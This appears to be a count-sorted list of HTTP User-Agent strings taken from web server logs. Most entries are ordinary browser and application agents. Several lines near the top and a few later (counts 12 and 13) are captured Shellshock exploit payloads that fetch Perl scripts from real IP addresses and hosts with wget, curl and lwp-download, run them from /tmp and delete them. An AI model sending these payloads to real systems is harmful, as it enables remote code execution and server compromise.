1;() { :;}; /bin/bash -c "cd /tmp;lwp-download -a http://185.70.10.139/mk2;curl -O http://185.70.10.139/mk2;wget http://185.70.10.139/mk2;perl mk2;perl /tmp/mk2;rm -rf /tmp/mk2*"
1;() { :;}; /bin/bash -c "cd /tmp;lwp-download -a http://31.131.4.153/dx3;curl -O http://31.131.4.153/dx3;wget http://31.131.4.153/dx3;perl /tmp/dx3*;perl dx3;rm -rf /tmp/dx3*"
1;() { :;}; /bin/bash -c "cd /tmp;lwp-download -a http://31.220.3.180/j.sec;curl -O http://31.220.3.180/j.sec;wget http://31.220.3.180/j.sec;perl /tmp/j.sec*;perl j.sec;rm -rf /tmp/j.sec*"
1;() { :;}; /bin/bash -c "cd /tmp;lwp-download -a http://31.220.3.180/led.sec;curl -O http://31.220.3.180/led.sec;wget http://31.220.3.180/led.sec;perl /tmp/led.sec*;perl led.sec;rm -rf /tmp/led.sec*"
1;() { :;}; /bin/bash -c "wget http://82.118.236.241/functions"
1;1.7.3-B/267511/5.1
1;1.7.3-B/267829/5.0
1;67_1stlaunch_monster
1;BingBar 7.0.610.0
1;Borland Delphi 60
1;Charlie Hebdo
1;Cloud mapping experiment searching for shoutcast servers. Contact [email]
1;Cloud mapping experiment. Contact [email]
1;compatible;Baiduspider/2.0; +http://www.baidu.com/search/spider.html
1;CountInstallation
1;Docudesk_Agent
1;FoxitCloud
1;GMon/0.0.1
1;Go http package
1;Go-http-client/1.1
1;gzip
1;HTTP_Request2/0.5.2 (http://pear.php.net/package/http_request2) PHP/5.2.6-1+lenny9
1;HTTP_Request2/0.5.2 (http://pear.php.net/package/http_request2) PHP/5.5.9-1ubuntu4.14
1;HTTP_Request2/2.2.1 (http://pear.php.net/package/http_request2) PHP/5.3.16
1;HTTP_Request2/2.2.1 (http://pear.php.net/package/http_request2) PHP/5.4.16
1;HttpClient
1;jucheck
1;libcurl-agent/1.0
1;libwww-perl/6.13
1;lwp-request/6.03 libwww-perl/6.08
1;Microsoft URL Control - 6.01.9782
1;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)
1;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
1;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
1;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; .NET CLR 1.1.4322; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
1;Mozilla/4.0 (compatible; qip4301; QSI13; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
1;Mozilla/4.0 (compatible; qip4301; QSI14; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
1;Mozilla/4.0 (compatible; qip4301; QSI2; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
1;Mozilla/4.0 (compatible; qip4301; QSI5; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
1;Mozilla/4.0 (compatible; qip4301; QSI6; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
1;Mozilla/4.0 (compatible; qip4301; QSI8; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
1;Mozilla/4.0 (compatible; qip4301; QSI9; Windows NT 6.1; ID:66C4E5B3FC2EA5A8F6A528B6F1507226)
1;Mozilla/4.0 (compatible; qip4983; params )
1;Mozilla/4.0 (compatible; qip4983; QSI10; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
1;Mozilla/4.0 (compatible; qip4983; QSI14; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
1;Mozilla/4.0 (compatible; qip4983; QSI15; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
1;Mozilla/4.0 (compatible; qip4983; QSI19; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
1;Mozilla/4.0 (compatible; qip4983; QSI20; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
1;Mozilla/4.0 (compatible; qip4983; QSI21; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
1;Mozilla/4.0 (compatible; qip4983; QSI27; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
1;Mozilla/4.0 (compatible; qip4983; QSI29; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
1;Mozilla/4.0 (compatible; qip4983; QSI32; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
1;Mozilla/4.0 (compatible; qip4983; QSI33; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
1;Mozilla/4.0 (compatible; qip4983; QSI37; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
1;Mozilla/4.0 (compatible; qip4983; QSI39; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
1;Mozilla/4.0 (compatible; qip4983; QSI54; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
1;Mozilla/4.0 (compatible; qip4983; QSI57; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
1;Mozilla/4.0 (compatible; qip4983; QSI62; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
1;Mozilla/4.0 (compatible; qip4983; QSI67; Windows NT 5.1; ID:5A1A2A54BA33A6D7BBC975A26CDEF949)
1;Mozilla/4.0 (compatible; qip6936)
1;Mozilla/4.0 (compatible; qip7000; params )
1;Mozilla/4.0 (compatible; qip8092; Windows NT 6.0; ID:1e9f30154e24aa3c84409e3d44dab708)
1;Mozilla/4.0 (compatible; qip8095; Windows NT 5.1; params)
1;Mozilla/4.0 (compatible; Win32)
1;Mozilla/5.0 (compatible; Konqueror/2.2.2; Linux 2.4.14-xfs; X11; i686)
1;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36
1;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A
1;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36
1;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36
1;Mozilla/5.0 (Windows NT 5.1; rv:35.0) Gecko/20100101 Firefox/35.0
1;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
1;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36
1;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0
1;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
1;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0
1;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/42.0
1;Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
1;Mozilla/5.0 (Windows NT x.y; Win64; x64; rv:10.0) Gecko/20100101 Firefox/10.0
1;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6
1;Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11
1;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36
1;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040413 Epiphany/1.2.1
1;NSIS
1;OfferCast3
1;OpenOffice 4.1.2 (412m3(Build:9782); Windows; x86; BundledLanguages=ru)
1;Opera NetInstaller/35.0.2066.37
1;Opera/7.21 (Windows NT 5.1; U)
1;Opera/9.80 (X11; Linux x86_64) Presto/2.12.388 Version/12.16
1;Paragon NTFS for Mac/12.2.313 Sparkle/1.5
1;Paragon Promo/1 Sparkle/1.5
1;PowerRegister
1;python-requests/2.1.0 CPython/2.7.6 Linux/3.19.0-31-generic
1;python-requests/2.2.1 CPython/2.7.6 Linux/2.6.32-042stab092.1
1;python-requests/2.4.3 CPython/2.7.9 Linux/3.16.0-4-686-pae
1;python-requests/2.8.0
1;python-requests/2.9.1
1;Python-urllib/1.17
1;Python-urllib/2.6
1;server-bag [Mac OS X,10.9.5,13F1507,MacBookAir6,2]
1;Skype� 7.16
1;StatisticsEx/2.0
1;Syncer/5.00 (unknown)
1;Total Network Monitor 2
1;unused/0 (m2note LMY47D); gzip
1;VEhMIFcyMDA7MTc7NC4yLjE7VEhMLUNOLTlCMThELVAxODhGMDRWMS4xLjE7MzUzNzQ2MDIxMDkzNzEyOzI1MDIwMzMxMjkyODU4MztudWxsOztudWxsO251bGw7O251bGw7bnVsbDtjb20ubW9iaWxldW5jbGUudG9vbGJveDozMjc6QVJlY2VpdmVyOklBOzE7VEVMRTI=
1;Wget/1.16.3 (linux-gnu)
1;Windows-Media-Player/10.00.00.3997
1;WLInstaller/2.0
10;AccessPoint/3.36.0 (e556c)
10;Dr.Web anti-virus Light Version: 9.00.2.14001 Device model: Lenovo A328 Firmware version: 4.4.2
10;Kaspersky Downloader
10;M44-toolbox/20130809v2.9.5;THL;THL W200;17;4.2.1;THL-CN-9B18D-P188F04V1.1.1
10;Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)
10;Mozilla/4.0 (compatible; qip8082; Windows NT 5.1; ID:9021a6147d1c0cb5d6009c88ca8d9464)
10;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36
10;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
10;unused/0 (delos3geur JZO54K); gzip
100;2gis/3.15.10.4952 (Windows 5.1 build 2600 NT Service Pack 3) 793d80f8-2746-464f-8aeb-e19627a7f8f5
100;APNU
1000328;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
100136;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.103 Safari/537.36
102;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
102;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
102;R26JY69RPL.com.vk.vkclient
1021;SDK 1.5
103;2gis/1.0.0.4952 (Windows 5.1 build 2600 NT Service Pack 3) 97774056-0766-4139-ac33-fcf5bfb72dd2
103;MpCommunication
10408;1C+Enterprise/8.3
105;Mozilla/4.0 (compatible; qip4301; Windows NT 6.1)
105;Mozilla/5.0 (compatible; IE 11.0; Win32; Trident/7.0)
10569;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36 OPR/34.0.2036.47 (Edition Yx)
106260;-
1065;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
107;Microsoft Office/11.0 (Windows NT 5.1; Microsoft Excel 11.0.8202; Pro)
108;2gis/3.15.10.4952 (Windows 5.1 build 2600 NT Service Pack 3) 97774056-0766-4139-ac33-fcf5bfb72dd2
11;apache
11;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.1)
11;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36 OPR/30.0.1835.88
11;Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7
11;NSPlayer/11.0.5721.5251
11;Telesphoreo
11;unused/0 (hammerhead MHC19J); gzip
11;Windows-Media-Player/11.0.5721.5293
110;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
1103;MRAICQ 8.3 (build 7317) +79627054326 icq
111;Opera/9.80 (Windows NT 5.1) Presto/2.12.388 Version/12.15
113;SilentUpdate
11447;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2; .NET4.0C; .NET4.0E)
115;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; MRA 8.3 (build 7317); .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E; AskTbFXTV5/5.9.1.14019)
115230;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 YaBrowser/15.12.1.6475 Safari/537.36
118;Chrome WIN 48.0.2564.97 (97d2b858fc7c3d480a52f4b58ed72c76fa535598-refs/branch-heads/2564@{#631}) channel(stable)
118;MSDW
119;Skype WISPr
12;() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system(" wget http://204.232.209.188/images/freshcafe/slice_30_192.png ; curl -O http://204.232.209.188/images/freshcafe/slice_30_192.png ; fetch http://204.232.209.188/images/freshcafe/slice_30_192.png ; lwp-download  http://204.232.209.188/images/freshcafe/slice_30_192.png ; GET http://204.232.209.188/images/freshcafe/slice_30_192.png ; lynx http://204.232.209.188/images/freshcafe/slice_30_192.png  ");'
12;Apache-HttpClient/4.4.1 (Java/1.8.0_60)
12;HTC Streaming Player htc_europe / 1.0 / htc_primou / 4.0.3
12;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
12;Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Thunderbird/38.2.0
12;unused/0 (gtel3g KTU84P); gzip
12;WATClient
1205;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)
1206533;SeaPort/3.1
121;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2; .NET4.0C; .NET4.0E; IDCRL 6.500.3165.0; IDCRL-cfg 6.500.12320.0; IDCRL-ui 6.500.3165.0; App WLIDSVC.EXE, 6.500.3165.0, {DF60E2DF-88AD-4526-AE21-83D130EF0F68})
122;Chrome WIN 48.0.2564.103 (cc2c23a615e1c898bc58b1fb818c41f214f509d8-refs/branch-heads/2564@{#657}) channel(stable)
12261;FULLSTUFF
1232;Agoo-sdk-2.0
1240;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
1249;McHttpH
1277;Mozilla/4.0 (compatible; MSIE 8.0; Win32; Trident/4.0)
12860;Mozilla/5.0 (Windows NT 6.1; rv:43.0) Gecko/20100101 Firefox/43.0
129;2gis/1.0.0.5247 (Windows 5.2 build 3790 NT Service Pack 2) 58620451-d1d0-42de-a85b-12a02a6e3539
1294;MICROSOFT_DEVICE_METADATA_RETRIEVAL_CLIENT
13;() { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("wget http://www.alyaly.info/non/non -O /tmp/b.pl;curl -O /tmp/b.pl http://www.alyaly.info/non/non;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'
13;CppAnalytics
13;Google Update/1.3.29.1;winhttp;cup-ecdsa
13;Mozilla/4.0 (compatible; MSIE 9.11.9600.18015; Windows NT 6.1)
13;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
130;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36 OPR/30.0.1835.88 (Edition Campaign 67)
131;WinINet HttpStack/14
134;Chrome WIN 47.0.2526.106 (19b9e1a5713f4b9ae324bd59bbe16ca6eb91d0e0-refs/branch-heads/2526@{#532}) channel(stable)
135;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2
1353;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36
137485;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
139;2gis/3.16.3.5247 (Windows 5.1 build 2600 NT Service Pack 3) 97774056-0766-4139-ac33-fcf5bfb72dd2
14;CPCrypto
14;Mozilla/4.0 (CCleaner, 5.06.5219)
14;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)
145;2gis/1.0.0.4952 (Windows 5.1 build 2600 NT Service Pack 3) 793d80f8-2746-464f-8aeb-e19627a7f8f5
14523;MRAICQ 8.2 (build 7046) 640530270 icq
149857;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36
15;HPWinMars550
15;Mordo Online updater 1.0
15;Mozilla/5.0 (Windows NT 5.2; rv:30.0) Gecko/20100101 Firefox/30.0
15;Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
15;SonyEricssonPCCompanion/2.10.303
15;unused/0 (ASUS_T00J KVT49L); gzip
151;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
154;Chrome WIN 49.0.2623.87 (d177478d466b84ab06f0f48081fc30e3b04be6ca-refs/branch-heads/2623@{#592}) channel(stable)
15593;MRAICQ 8.3 (build 7317) +79111977193 icq
157;GameXPService/1.4.0 (d7ea0)
159293;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36
16;gSOAP/2.7
16;install traffic
16;Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15
16;MRAICQ 8.3 (build 7317) [email] icq
16066;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0
16331;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36 OPR/34.0.2036.25
165;SP_Connector
166;CMTalkerSDK.0.0.1
167;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; MRA 8.3 (build 7317); .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E; AskTbFXTV5/5.9.1.14019)
17;AlterGeoUpdater/3.5.4
17;AMPVConnector
17;com.mxtech.videoplayer.ad/86
17;Google-HTTP-Java-Client/1.12.0-beta (gzip)
17;Microsoft Office Protocol Discovery
17;netscan
17;unused/0 (g2 LRX22G); gzip
170;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; BRI/2)
170;Wget/1.13.4 (linux-gnueabi)
17202;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36
17260;MRAICQ 8.2 (build 7067) 686888390 icq
173;WinINet HttpStack/11
1738;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
17907;MRAICQ 8.3 (build 7317) 676962764 icq
18;CaptiveNetworkSupport-325.10.1 wispr
18;DVGet
18;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.4.2403.3 Amigo/44.4.2403.3 MRCHROME SOC Safari/537.36 CHANNEL_789104
18;Mozilla/5.0 (Windows NT 5.1; rv:39.0) Gecko/20100101 Firefox/39.0
18;Windows-Media-Player/12.0.7601.18840
181;okhttp/2.2.0
181;QGUpdater 1.0
186;Foxit Reader
1864;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
1878;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2; .NET4.0C; .NET4.0E)
188;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36
19;BTWebClient/3450(41162)
19;CaptiveNetworkSupport-277.10.5 wispr
19;GoogleEarth
